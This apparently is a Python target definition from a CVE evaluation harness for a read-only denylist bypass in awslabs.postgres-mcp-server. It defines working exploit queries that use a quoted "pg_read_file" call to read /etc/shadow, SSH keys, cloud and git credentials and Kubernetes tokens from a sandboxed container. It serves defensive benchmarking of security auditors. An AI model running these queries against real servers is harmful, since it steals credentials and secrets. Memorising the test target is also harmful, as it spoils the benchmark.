"""CVE-2026-85787: awslabs.postgres-mcp-server read-only denylist bypass (CWE-184).

In read-only mode, 1.1.6 checks run_query's SQL against an application-level blocklist whose
dangerous-function pattern does not fold a double-quoted identifier, so `"pg_read_file"(...)` slips
past it and runs as the connected superuser, returning a file outside the database scope in the
query result: reach = arbitrary_read. The same incompleteness leaves dblink reachable
(internal_fetch), and sibling CVE-2026-87911 (COPY ... PROGRAM) carries command_execution. 1.1.7
folds quoted identifiers before matching and blocks the dblink family.

The real PostgreSQL backend runs co-located in the server's image, started by its entrypoint, so the
bypass reads files of the server's own container. connect_to_database resolves the endpoint through
RDS DescribeDBInstances and the credentials through Secrets Manager GetSecretValue, both served by
stand-ins under their real AWS names; botocore trusts the fixture authority through AWS_CA_BUNDLE.

Deployment layout: the server runs from the checkout (/srv/app) under the unprivileged account, the
layout read-only, no network of its own.
"""

import re

from evals.cve.detection.targets import Target
from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_base import PublicNames
from evals.cve_planting_spec import resolve_container_path
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2026-85787-postgres"
PATCHED = "holdout-2026-85787-postgres-patched"
REGION = "us-east-1"
WORKING_DIRECTORY = "/srv/app"

# The quoted-identifier read primitive the denylist bypass leaves open in read-only mode.
AIM = re.compile(r'(?i)"pg_(?:read_file|read_binary_file|ls_dir)"')

_CONNECT_ARGS = {
    "region": REGION,
    "database_type": "RPG",
    "connection_method": "pgwire",
    "cluster_identifier": "",
    "db_endpoint": "localhost",
    "port": 5432,
    "database": "postgres",
}
_QUERY_KEYS = {
    "connection_method": "pgwire",
    "cluster_identifier": "",
    "db_endpoint": "localhost",
    "database": "postgres",
}

# Places read through the quoted-identifier bypass at an absolute container path, one exploit each.
_FILE_PLACES: tuple[str, ...] = (
    "etc-shadow",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "auth-log",
)
# container-hostname carries no catalogue path: the --hostname nonce lands on the holder, whose
# /etc/hostname Docker shares into the target under --network container:<holder>.
_HOSTNAME_READ_PATH = "/etc/hostname"
KEPT_PLACES: tuple[str, ...] = (*_FILE_PLACES, "container-hostname")


def _first_path(place: Place) -> str:
    coordinates = place.coordinates
    raw = coordinates.paths[0] if coordinates.paths is not None else coordinates.path
    if raw is None:
        raise ValueError(f"{place.id}: a file place with no path coordinate")
    return resolve_container_path(raw, WORKING_DIRECTORY)


async def _connect(client: MCPClientPort) -> None:
    await client.call_tool("connect_to_database", dict(_CONNECT_ARGS))


async def _run_query(client: MCPClientPort, sql: str) -> None:
    await client.call_tool("run_query", {"sql": sql, **_QUERY_KEYS})


def _exploit_for(place_id: str):
    async def exploit(places: Places, client: MCPClientPort) -> None:
        await _connect(client)
        path = _first_path(places[place_id])
        await _run_query(client, f"SELECT \"pg_read_file\"('{path}')")

    return exploit


async def _hostname_exploit(places: Places, client: MCPClientPort) -> None:
    await _connect(client)
    await _run_query(client, f"SELECT \"pg_read_file\"('{_HOSTNAME_READ_PATH}')")


async def _benign(places: Places, client: MCPClientPort) -> None:
    await _connect(client)
    await _run_query(client, "SELECT 1")


TARGET = Target(
    flaw_id="CVE-2026-85787",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanisms=frozenset(
        {
            MechanismClass.READ_OUTSIDE_SCOPE,
            MechanismClass.INTERNAL_FETCH,
            MechanismClass.COMMAND_EXECUTION,
        }
    ),
    aim=AIM,
    reaches=frozenset({"arbitrary_read", "command_execution", "internal_fetch"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE, "stand-in"),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED,
        working_directory=WORKING_DIRECTORY,
        has_network=False,
        public_names=PublicNames(
            stand_ins=("rds.us-east-1.amazonaws.com", "secretsmanager.us-east-1.amazonaws.com"),
            trust=("AWS_CA_BUNDLE",),
        ),
    ),
    builder=command_injection_env,
    exploits=(*(_exploit_for(place_id) for place_id in _FILE_PLACES), _hostname_exploit),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Read-only denylist bypass (CWE-184): run_query's SQL validator does not fold a "
        'double-quoted identifier, so `"pg_read_file"(...)` slips past the dangerous-function '
        "check and runs as the connected superuser, returning a file outside the database scope."
    ),
    tools_filter=None,
)
